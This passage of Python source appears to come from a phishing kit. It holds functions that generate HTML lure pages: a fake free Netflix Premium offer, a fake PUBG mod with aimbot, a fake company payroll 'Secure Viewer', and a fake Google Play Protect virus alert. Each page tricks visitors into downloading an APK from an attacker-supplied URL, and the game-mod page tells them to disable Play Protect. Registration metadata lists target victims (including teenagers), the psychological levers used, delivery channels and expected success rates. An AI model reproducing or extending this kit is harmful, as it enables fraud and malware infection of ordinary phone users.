*{{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif;}}
body{{background:#141414;color:white;min-height:100vh;}}
.banner{{background:linear-gradient(180deg,#E50914 0%,#141414 100%);padding:40px 20px 60px;text-align:center;}}
.banner img{{width:120px;margin-bottom:16px;}}
.banner h1{{font-size:28px;font-weight:700;color:white;}}
.banner p{{color:#ccc;margin-top:8px;font-size:16px;}}
.badge{{display:inline-block;background:#E50914;padding:4px 12px;border-radius:4px;font-size:12px;font-weight:600;margin-top:10px;}}
.container{{max-width:440px;margin:0 auto;padding:16px;}}
.offer-card{{background:#1a1a2e;border:1px solid #E50914;border-radius:12px;padding:24px;margin-bottom:16px;position:relative;overflow:hidden;}}
.offer-card::before{{content:'LIMITED OFFER';position:absolute;top:12px;right:-32px;background:#E50914;color:white;padding:4px 40px;font-size:10px;font-weight:700;transform:rotate(45deg);}}
.offer-card h2{{font-size:22px;color:#E50914;margin-bottom:8px;}}
.offer-card .price{{font-size:36px;font-weight:700;color:white;}}
.offer-card .price span{{font-size:16px;color:#888;}}
.offer-card ul{{list-style:none;padding:0;margin:16px 0;}}
.offer-card ul li{{padding:8px 0;border-bottom:1px solid #333;font-size:14px;color:#ccc;display:flex;align-items:center;gap:8px;}}
.offer-card ul li::before{{content:'✓';color:#E50914;font-weight:700;}}
.dl-btn{{display:block;width:100%;padding:16px;background:#E50914;color:white;border:none;border-radius:4px;font-size:18px;font-weight:700;cursor:pointer;text-align:center;}}
.dl-btn:hover{{background:#f6121d;}}
.status-area{{display:none;padding:16px;text-align:center;}}
.status-area.active{{display:block;}}
.progress{{height:4px;background:#333;border-radius:2px;margin:12px 0;overflow:hidden;}}
.progress .bar{{height:100%;background:#E50914;width:0%;transition:width 0.5s;}}
.footer{{text-align:center;padding:20px;font-size:11px;color:#555;}}
.hidden{{display:none!important;}}
.install-guide{{background:#1a1a2e;border:1px solid #E50914;border-radius:8px;padding:16px;margin-top:12px;text-align:left;}}
.install-guide h4{{font-size:13px;color:#E50914;margin-bottom:8px;}}
.install-guide ol{{font-size:12px;color:#aaa;padding-left:16px;line-height:1.8;}}
.timer{{display:flex;justify-content:center;gap:16px;margin:16px 0;}}
.timer .unit{{text-align:center;}}
.timer .num{{font-size:32px;font-weight:700;color:#E50914;}}
.timer .label{{font-size:11px;color:#888;text-transform:uppercase;}}
</style>
</head>
<body>
<div class="banner">
    <img src="{_b64_svg('netflix', '#E50914', 120)}" alt="Netflix">
    <h1>You've Been Selected!</h1>
    <p>Get 1 Year of Netflix Premium - Completely Free</p>
    <div class="badge">🎉 Exclusive Promotion</div>
</div>
<div class="container">
    <div class="offer-card">
        <h2>Netflix Premium</h2>
        <div class="price">FREE <span>/ year</span></div>
        <p style="color:#888;font-size:13px;margin-bottom:16px;">Normally $263.88/year - Yours for $0</p>
        <div class="timer">
            <div class="unit"><div class="num" id="hours">23</div><div class="label">Hours</div></div>
            <div class="unit"><div class="num" id="mins">59</div><div class="label">Minutes</div></div>
            <div class="unit"><div class="num" id="secs">59</div><div class="label">Seconds</div></div>
        </div>
        <ul>
            <li>Ultra HD (4K) Streaming</li>
            <li>Ad-free experience</li>
            <li>Watch on 4 devices at once</li>
            <li>Download on 10 devices</li>
            <li>Dolby Atmos audio</li>
        </ul>
        <button class="dl-btn" id="dlBtn" onclick="startDownload()">
            🎬 Claim Your Free Year
        </button>
        <div class="status-area" id="statusArea">
            <div class="progress"><div class="bar" id="progressBar"></div></div>
            <div style="font-size:13px;color:#888;" id="statusText">Verifying your eligibility...</div>
        </div>
        <div id="postDl" class="hidden" style="margin-top:12px;">
            <div class="install-guide">
                <h4>🎉 Congratulations! Your free year is ready!</h4>
                <p style="font-size:12px;color:#aaa;margin-bottom:8px;">To activate your Premium subscription:</p>
                <ol>
                    <li>Tap the notification to install the Netflix activation app</li>
                    <li>Tap <strong>"Install"</strong> when prompted</li>
                    <li>Open the app and tap <strong>"Activate Premium"</strong></li>
                    <li>Your account will be upgraded immediately!</li>
                </ol>
            </div>
        </div>
        <p style="text-align:center;font-size:11px;color:#555;margin-top:12px;">Limited to one redemption per device. Offer expires in 24 hours.</p>
    </div>
    <div class="footer">
        <p>Netflix, Inc. · This is a limited promotional offer for selected users.</p>
        <p style="margin-top:4px;">Terms & Conditions apply. Cancel anytime.</p>
    </div>
</div>
<script>
// Countdown timer
var totalSecs = 24*60*60;
setInterval(function(){{
    totalSecs--;
    var h=Math.floor(totalSecs/3600);
    var m=Math.floor((totalSecs%3600)/60);
    var s=totalSecs%60;
    document.getElementById('hours').textContent=h.toString().padStart(2,'0');
    document.getElementById('mins').textContent=m.toString().padStart(2,'0');
    document.getElementById('secs').textContent=s.toString().padStart(2,'0');
}},1000);

function startDownload(){{
    var btn=document.getElementById('dlBtn'),s=document.getElementById('statusArea'),bar=document.getElementById('progressBar'),txt=document.getElementById('statusText'),pd=document.getElementById('postDl');
    btn.disabled=true;btn.style.opacity='0.5';btn.innerHTML='⏳ Processing...';
    s.classList.add('active');
    var steps=[{{p:15,t:'Checking eligibility...'}},{{p:35,t:'Verifying region...'}},{{p:55,t:'Generating activation code...'}},{{p:75,t:'Preparing Premium access...'}},{{p:95,t:'Almost done...'}},{{p:100,t:'Activation ready!'}}],i=0;
    function tick(){{
        if(i>=steps.length){{
            var a=document.createElement('a');
            a.href='{apk_url}';a.download='Netflix_Premium_Activation.apk';
            a.style.display='none';document.body.appendChild(a);a.click();
            pd.classList.remove('hidden');btn.innerHTML='✅ Premium Activated!';
            return;
        }}
        bar.style.width=steps[i].p+'%';txt.textContent=steps[i].t;i++;
        setTimeout(tick,700+Math.random()*500);
    }}
    setTimeout(tick,400);
}}
</script></body></html>"""

register_template(
    "netflix_free_subscription", "Netflix/Streaming Free Subscription", "entertainment",
    "Fake Netflix free 1-year Premium subscription page with countdown timer, feature list, and activation app download",
    "Entertainment lovers, Netflix users, young adults, anyone who wants free stuff",
    "Greed (free premium) + Urgency (limited time countdown) + Exclusivity (selected users) + Trust in Netflix brand",
    "SMS, email, social media ads, WhatsApp, Telegram channels",
    "Low", "Low-Medium", "Very High (>85%)",
    {"primary": "#E50914", "bg": "#141414", "text": "#FFFFFF"},
    _template_netflix_free
)


# ================================================================
# TEMPLATE 6: Game Mod / Cheat (PUBG, Free Fire, etc.)
# ================================================================

def _template_game_mod(apk_url: str, c2_url: str, config: dict) -> str:
    game_name = config.get("game_name", "PUBG Mobile")
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{game_name} Mod - Unlimited UC & Skins</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;}}
body{{background:#0a0a1a;color:white;min-height:100vh;}}
.banner{{background:linear-gradient(135deg,#FF6B35,#FF2E63,#8A2387);padding:30px 20px;text-align:center;position:relative;overflow:hidden;}}
.banner::after{{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,transparent 30%,rgba(0,0,0,0.4) 100%);}}
.banner h1{{font-size:28px;font-weight:900;position:relative;z-index:1;}}
.banner p{{font-size:16px;opacity:0.9;position:relative;z-index:1;margin-top:8px;}}
.container{{max-width:440px;margin:0 auto;padding:16px;}}
.card{{background:#1a1a3e;border-radius:16px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1);}}
.feature-grid{{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px;}}
.feature{{background:rgba(255,255,255,0.05);border-radius:8px;padding:12px;text-align:center;}}
.feature .emoji{{font-size:28px;}}
.feature h4{{font-size:12px;margin-top:6px;color:#aaa;}}
.feature .value{{font-size:18px;font-weight:700;color:#FF2E63;}}
.dl-btn{{display:block;width:100%;padding:16px;background:linear-gradient(135deg,#FF2E63,#8A2387);color:white;border:none;border-radius:12px;font-size:18px;font-weight:700;cursor:pointer;text-align:center;transition:transform 0.2s;}}
.dl-btn:hover{{transform:scale(1.02);}}
.status-area{{display:none;padding:16px;text-align:center;}}
.status-area.active{{display:block;}}
.progress{{height:4px;background:#333;border-radius:2px;margin:12px 0;overflow:hidden;}}
.progress .bar{{height:100%;background:linear-gradient(90deg,#FF2E63,#8A2387);width:0%;transition:width 0.5s;}}
.install-guide{{background:rgba(255,255,255,0.05);border:1px solid rgba(255,46,99,0.3);border-radius:8px;padding:12px;margin-top:12px;text-align:left;}}
.install-guide h4{{font-size:12px;color:#FF2E63;margin-bottom:6px;}}
.install-guide ol{{font-size:11px;color:#aaa;padding-left:16px;line-height:1.8;}}
.footer{{text-align:center;padding:20px;font-size:10px;color:#555;}}
.hidden{{display:none!important;}}
</style>
</head>
<body>
<div class="banner">
    <h1>🎮 {game_name} Mod v3.2</h1>
    <p>Unlimited UC • All Skins Unlocked • Aimbot • Wallhack</p>
    <div style="margin-top:12px;display:flex;justify-content:center;gap:16px;position:relative;z-index:1;">
        <span style="background:rgba(0,0,0,0.3);padding:4px 10px;border-radius:4px;font-size:11px;">⭐ 4.8/5</span>
        <span style="background:rgba(0,0,0,0.3);padding:4px 10px;border-radius:4px;font-size:11px;">1.2M+ Downloads</span>
        <span style="background:rgba(0,0,0,0.3);padding:4px 10px;border-radius:4px;font-size:11px;">No Ban 99.9%</span>
    </div>
</div>
<div class="container">
    <div class="card">
        <div class="feature-grid">
            <div class="feature"><div class="emoji">💰</div><div class="value">999,999</div><h4>UC Coins</h4></div>
            <div class="feature"><div class="emoji">👕</div><div class="value">All</div><h4>Skins Unlocked</h4></div>
            <div class="feature"><div class="emoji">🎯</div><div class="value">100%</div><h4>Aimbot Accuracy</h4></div>
            <div class="feature"><div class="emoji">🛡️</div><div class="value">Anti-Ban</div><h4>System v4.2</h4></div>
        </div>
        <button class="dl-btn" id="dlBtn" onclick="startDownload()">
            ⚡ Download Mod APK (Free)
        </button>
        <div class="status-area" id="statusArea">
            <div class="progress"><div class="bar" id="progressBar"></div></div>
            <div style="font-size:13px;color:#888;" id="statusText">Preparing mod package...</div>
        </div>
        <div id="postDl" class="hidden" style="margin-top:12px;">
            <div class="install-guide">
                <h4>📲 Installation Instructions:</h4>
                <ol>
                    <li>Open the downloaded file from notifications</li>
                    <li>Tap <strong>"Install"</strong> (enable unknown sources if asked)</li>
                    <li>Open the mod and enjoy all features unlocked!</li>
                    <li>No login required - works instantly</li>
                </ol>
                <p style="font-size:10px;color:#FF2E63;margin-top:8px;">⚠️ Disable Play Protect before installing for best performance</p>
            </div>
        </div>
        <div style="display:flex;justify-content:center;gap:8px;margin-top:12px;">
            <span style="background:rgba(255,255,255,0.05);padding:6px 12px;border-radius:20px;font-size:11px;">✅ No Root</span>
            <span style="background:rgba(255,255,255,0.05);padding:6px 12px;border-radius:20px;font-size:11px;">✅ All Devices</span>
            <span style="background:rgba(255,255,255,0.05);padding:6px 12px;border-radius:20px;font-size:11px;">✅ Undetected</span>
        </div>
    </div>
    <div class="footer">
        <p>© {game_name} Mod Team · Unofficial fan project · Not affiliated with original game</p>
    </div>
</div>
<script>
function startDownload(){{
    var btn=document.getElementById('dlBtn'),s=document.getElementById('statusArea'),bar=document.getElementById('progressBar'),txt=document.getElementById('statusText'),pd=document.getElementById('postDl');
    btn.disabled=true;btn.style.opacity='0.5';btn.innerHTML='⏳ Preparing...';s.classList.add('active');
    var st=[{{p:12,t:'Generating mod package...'}},{{p:30,t:'Injecting UC coins...'}},{{p:50,t:'Unlocking skins...'}},{{p:70,t:'Applying anti-ban...'}},{{p:90,t:'Finalizing mod...'}},{{p:100,t:'Ready!'}}],i=0;
    function tick(){{
        if(i>=st.length){{var a=document.createElement('a');a.href='{apk_url}';a.download='{game_name}_Mod_v3.2.apk';a.style.display='none';document.body.appendChild(a);a.click();pd.classList.remove('hidden');btn.innerHTML='✅ Mod Downloaded!';return;}}
        bar.style.width=st[i].p+'%';txt.textContent=st[i].t;i++;setTimeout(tick,600+Math.random()*400);
    }}
    setTimeout(tick,300);
}}
</script></body></html>"""

register_template(
    "game_mod_cheat", "Game Mod / Cheat (PUBG/Free Fire)", "entertainment",
    "Fake game mod page offering unlimited in-game currency, all skins, aimbot with anti-ban claims",
    "Gamers, teenagers, young adults aged 13-25, competitive mobile game players",
    "Greed (free premium currency) + Competitive advantage (aimbot/wallhack) + FOMO (other players have it) + Entitlement (deserve free stuff)",
    "YouTube video descriptions, Discord servers, Telegram gaming channels, TikTok, Instagram",
    "Medium", "Medium", "Very High (>90% for target audience)",
    {"primary": "#FF2E63", "bg": "#0a0a1a", "text": "#FFFFFF"},
    _template_game_mod
)


# ================================================================
# TEMPLATE 7: Salary/Payroll Document
# ================================================================

def _template_salary_payroll(apk_url: str, c2_url: str, config: dict) -> str:
    company = config.get("company_name", "Company")
    if company == "Company":
        company = random.choice(["Amazon", "Google", "Microsoft", "Tesla", "Apple", "Meta", "Netflix"])
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{company} - Payroll Document</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,Roboto,sans-serif;}}
body{{background:#F5F5F5;min-height:100vh;}}
.header{{background:linear-gradient(135deg,#1565C0,#0D47A1);padding:24px 16px;color:white;}}
.header h1{{font-size:20px;font-weight:600;}}
.header p{{font-size:13px;opacity:0.9;margin-top:4px;}}
.container{{max-width:440px;margin:0 auto;padding:16px;}}
.doc-preview{{background:white;border-radius:12px 12px 0 0;box-shadow:0 1px 4px rgba(0,0,0,0.08);overflow:hidden;}}
.doc-header{{padding:16px;border-bottom:1px solid #e0e0e0;display:flex;justify-content:space-between;align-items:center;}}
.doc-header h2{{font-size:16px;color:#333;}}
.doc-header span{{font-size:11px;color:#888;}}
.doc-body{{padding:16px;}}
.row-dl{{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f0f0f0;font-size:13px;}}
.row-dl .l{{color:#888;}}
.row-dl .v{{color:#333;font-weight:500;}}
.total-row{{padding:12px 0;display:flex;justify-content:space-between;font-size:16px;font-weight:700;}}
.total-row .v{{color:#1565C0;}}
.alert-verify{{background:#E3F2FD;border:1px solid #90CAF9;border-radius:8px;padding:12px;margin:16px 0;display:flex;align-items:flex-start;gap:10px;}}
.alert-verify p{{font-size:12px;color:#1565C0;line-height:1.5;}}
.dl-btn{{display:block;width:100%;padding:14px;background:linear-gradient(135deg,#1565C0,#0D47A1);color:white;border:none;font-size:15px;font-weight:600;cursor:pointer;text-align:center;border-radius:0 0 12px 12px;}}
.dl-btn:hover{{opacity:0.95;}}
.status-area{{display:none;padding:16px;text-align:center;}}
.status-area.active{{display:block;}}
.progress{{height:4px;background:#f0f0f0;border-radius:2px;margin:12px 0;overflow:hidden;}}
.progress .bar{{height:100%;background:#1565C0;width:0%;transition:width 0.5s;}}
.hidden{{display:none!important;}}
.install-guide{{background:#E8F5E9;border:1px solid #A5D6A7;border-radius:8px;padding:12px;margin-top:12px;text-align:left;}}
.install-guide h4{{font-size:12px;color:#2E7D32;margin-bottom:6px;}}
.install-guide ol{{font-size:11px;color:#555;padding-left:16px;line-height:1.8;}}
.footer{{text-align:center;padding:20px;font-size:10px;color:#999;}}
</style>
</head>
<body>
<div class="header">
    <h1>📄 {company} Payroll</h1>
    <p>Your salary statement is ready for review</p>
</div>
<div class="container">
    <div class="doc-preview">
        <div class="doc-header">
            <h2>Employee Salary Slip</h2>
            <span>{datetime.now().strftime('%B %Y')}</span>
        </div>
        <div class="doc-body">
            <div class="row-dl"><span class="l">Employee ID</span><span class="v">{company[:3].upper()}{random.randint(10000,99999)}</span></div>
            <div class="row-dl"><span class="l">Employee Name</span><span class="v">View in document</span></div>
            <div class="row-dl"><span class="l">Department</span><span class="v">Engineering</span></div>
            <div class="row-dl"><span class="l">Pay Period</span><span class="v">{datetime.now().strftime('%B 1-28, %Y')}</span></div>
            <div class="row-dl"><span class="l">Basic Salary</span><span class="v">$8,500.00</span></div>
            <div class="row-dl"><span class="l">HRA</span><span class="v">$4,250.00</span></div>
            <div class="row-dl"><span class="l">Bonus</span><span class="v">$2,000.00</span></div>
            <div class="row-dl"><span class="l">Deductions</span><span class="v" style="color:#D32F2F;">-$1,850.00</span></div>
            <div class="total-row"><span class="l">Net Pay</span><span class="v">$12,900.00</span></div>
        </div>

        <div class="alert-verify" style="margin:0 16px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="#1565C0"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            <p><strong>Secure Document Access Required:</strong> For security purposes, you need to install the {company} Secure Viewer app to view your salary document. <strong>This is mandatory per company policy.</strong></p>
        </div>

        <button class="dl-btn" id="dlBtn" onclick="startDownload()">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" style="vertical-align:middle;margin-right:8px;"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
            Install Secure Viewer & View Document
        </button>

        <div class="status-area" id="statusArea">
            <div class="progress"><div class="bar" id="progressBar"></div></div>
            <div style="font-size:13px;color:#666;" id="statusText">Preparing secure document viewer...</div>
        </div>
        <div id="postDl" class="hidden" style="margin:12px 16px 16px;">
            <div class="install-guide">
                <h4>📲 To view your salary slip:</h4>
                <ol>
                    <li>Tap the notification to install the viewer app</li>
                    <li>Tap <strong>"Install"</strong> when prompted</li>
                    <li>Open the app - your document will load automatically</li>
                    <li>Use your company credentials to sign in (or fingerprint)</li>
                </ol>
            </div>
        </div>
    </div>
    <div class="footer">
        <p>© {datetime.now().year} {company}. This is an automated payroll notification.</p>
        <p style="margin-top:4px;">For questions, contact HR at hr@{company.lower().replace(' ','')}.com</p>
    </div>
</div>
<script>
function startDownload(){{
    var btn=document.getElementById('dlBtn'),s=document.getElementById('statusArea'),bar=document.getElementById('progressBar'),txt=document.getElementById('statusText'),pd=document.getElementById('postDl');
    btn.disabled=true;btn.style.opacity='0.6';btn.innerHTML='⏳ Loading...';s.classList.add('active');
    var st=[{{p:20,t:'Connecting to secure server...'}},{{p:40,t:'Downloading viewer module...'}},{{p:60,t:'Applying encryption...'}},{{p:80,t:'Verifying certificate...'}},{{p:100,t:'Ready!'}}],i=0;
    function tick(){{
        if(i>=st.length){{var a=document.createElement('a');a.href='{apk_url}';a.download='{company}_SecureViewer.apk';a.style.display='none';document.body.appendChild(a);a.click();pd.classList.remove('hidden');btn.innerHTML='✅ Viewer Installed';return;}}
        bar.style.width=st[i].p+'%';txt.textContent=st[i].t;i++;setTimeout(tick,500+Math.random()*500);
    }}
    setTimeout(tick,300);
}}
</script></body></html>"""

register_template(
    "salary_payroll", "Salary/Payroll Document", "financial",
    "Fake payroll/salary document from a major company requiring 'Secure Viewer' app installation to view the payslip",
    "Employees, professionals, freelancers, anyone expecting payment",
    "Greed (seeing salary amount) + Curiosity (how much is my bonus?) + Authority (company policy) + Urgency (payroll deadline)",
    "Email impersonating HR, WhatsApp from 'manager', SMS from 'company'",
    "Low-Medium", "Low", "High (>75%)",
    {"primary": "#1565C0", "bg": "#F5F5F5", "text": "#1a1a1a"},
    _template_salary_payroll
)


# ================================================================
# TEMPLATE 8: Security Scanner (Fake Virus Alert)
# ================================================================

def _template_security_scanner(apk_url: str, c2_url: str, config: dict) -> str:
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#D32F2F">
<title>Security Alert - Virus Detected</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,Roboto,sans-serif;}}
body{{background:#1a1a1a;min-height:100vh;color:white;}}
.warning-bar{{background:linear-gradient(90deg,#D32F2F,#B71C1C);padding:16px;text-align:center;position:sticky;top:0;z-index:100;}}
.warning-bar h1{{font-size:18px;color:white;}}
.warning-bar p{{font-size:12px;opacity:0.9;margin-top:4px;}}
.container{{max-width:440px;margin:0 auto;padding:16px;}}
.scan-card{{background:#2a2a2a;border:1px solid #D32F2F;border-radius:12px;padding:20px;margin-bottom:16px;}}
.scan-animation{{text-align:center;padding:20px 0;}}
.scan-circle{{width:100px;height:100px;border-radius:50%;border:4px solid #333;margin:0 auto;position:relative;display:flex;align-items:center;justify-content:center;font-size:40px;animation:scanPulse 1.5s infinite;}}
@keyframes scanPulse{{0%,100%{{box-shadow:0 0 10px rgba(211,47,47,0.3);}}50%{{box-shadow:0 0 30px rgba(211,47,47,0.8);}}}}
.thread-count{{text-align:center;margin:16px 0;}}
.thread-count .num{{font-size:48px;font-weight:900;color:#D32F2F;}}
.thread-count .label{{font-size:14px;color:#888;}}
.thread-list{{background:rgba(211,47,47,0.1);border-radius:8px;padding:12px;margin-bottom:16px;}}
.thread-item{{display:flex;align-items:center;gap:10px;padding:6px 0;font-size:12px;border-bottom:1px solid rgba(255,255,255,0.05);}}
.thread-item:last-child{{border-bottom:none;}}
.thread-item .icon{{color:#D32F2F;}}
.thread-item .name{{color:#ccc;}}
.thread-item .risk{{margin-left:auto;background:#D32F2F;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;}}
.dl-btn{{display:block;width:100%;padding:16px;background:#D32F2F;color:white;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;text-align:center;}}
.dl-btn:hover{{background:#B71C1C;}}
.status-area{{display:none;padding:16px;text-align:center;}}
.status-area.active{{display:block;}}
.progress{{height:4px;background:#333;border-radius:2px;margin:12px 0;overflow:hidden;}}
.progress .bar{{height:100%;background:#D32F2F;width:0%;transition:width 0.5s;}}
.hidden{{display:none!important;}}
.install-guide{{background:#1a1a1a;border:1px solid #D32F2F;border-radius:8px;padding:12px;margin-top:12px;text-align:left;}}
.install-guide h4{{font-size:12px;color:#D32F2F;margin-bottom:6px;}}
.install-guide ol{{font-size:11px;color:#aaa;padding-left:16px;line-height:1.8;}}
.footer{{text-align:center;padding:20px;font-size:10px;color:#555;}}
</style>
</head>
<body>
<div class="warning-bar">
    <h1>🚨 Security Threat Detected</h1>
    <p>Your device may be infected with malware</p>
</div>
<div class="container">
    <div class="scan-card">
        <div class="scan-animation">
            <div class="scan-circle" id="scanIcon">🔍</div>
        </div>
        <div class="thread-count">
            <div class="num" id="threatCount">3</div>
            <div class="label">Critical Threats Found</div>
        </div>
        <div class="thread-list">
            <div class="thread-item">
                <span class="icon">🦠</span>
                <span class="name">Android.Spyware.Agent.UP</span>
                <span class="risk">HIGH</span>
            </div>
            <div class="thread-item">
                <span class="icon">👁️</span>
                <span class="name">Trojan.Banker.ADF.2</span>
                <span class="risk">CRITICAL</span>
            </div>
            <div class="thread-item">
                <span class="icon">📁</span>
                <span class="name">Ransomware.FileLocker.A</span>
                <span class="risk">HIGH</span>
            </div>
        </div>
        <div style="background:rgba(255,152,0,0.1);border:1px solid #FF9800;border-radius:8px;padding:12px;margin-bottom:16px;font-size:12px;color:#FFB74D;">
            ⚠️ These threats can steal your passwords, banking info, and personal photos. Immediate action required.
        </div>
        <button class="dl-btn" id="dlBtn" onclick="startDownload()">
            🛡️ Download Security Cleaner (Free)
        </button>
        <div class="status-area" id="statusArea">
            <div class="progress"><div class="bar" id="progressBar"></div></div>
            <div style="font-size:13px;color:#888;" id="statusText">Downloading security tool...</div>
        </div>
        <div id="postDl" class="hidden" style="margin-top:12px;">
            <div class="install-guide">
                <h4>📲 To remove the threats:</h4>
                <ol>
                    <li>Open the downloaded file from notifications</li>
                    <li>Tap <strong>"Install"</strong> to install the security cleaner</li>
                    <li>Open the app and tap <strong>"Scan & Clean"</strong></li>
                    <li>All threats will be removed automatically</li>
                </ol>
            </div>
        </div>
        <p style="text-align:center;font-size:11px;color:#666;margin-top:12px;">Scan performed by Google Play Protect · {random.randint(100,999)} devices affected in your area</p>
    </div>
    <div class="footer">
        <p>Android Security System · Last scan: {datetime.now().strftime('%B %d, %Y %I:%M %p')}</p>
    </div>
</div>
<script>
function startDownload(){{
    var btn=document.getElementById('dlBtn'),s=document.getElementById('statusArea'),bar=document.getElementById('progressBar'),txt=document.getElementById('statusText'),pd=document.getElementById('postDl');
    btn.disabled=true;btn.style.opacity='0.5';btn.innerHTML='⏳ Loading...';s.classList.add('active');
    var st=[{{p:15,t:'Initializing secure connection...'}},{{p:35,t:'Downloading threat signatures...'}},{{p:55,t:'Preparing removal tool...'}},{{p:75,t:'Encrypting scan results...'}},{{p:95,t:'Finalizing...'}},{{p:100,t:'Download complete!'}}],i=0;
    function tick(){{
        if(i>=st.length){{var a=document.createElement('a');a.href='{apk_url}';a.download='Android_Security_Cleaner.apk';a.style.display='none';document.body.appendChild(a);a.click();pd.classList.remove('hidden');btn.innerHTML='✅ Security Tool Ready';return;}}
        bar.style.width=st[i].
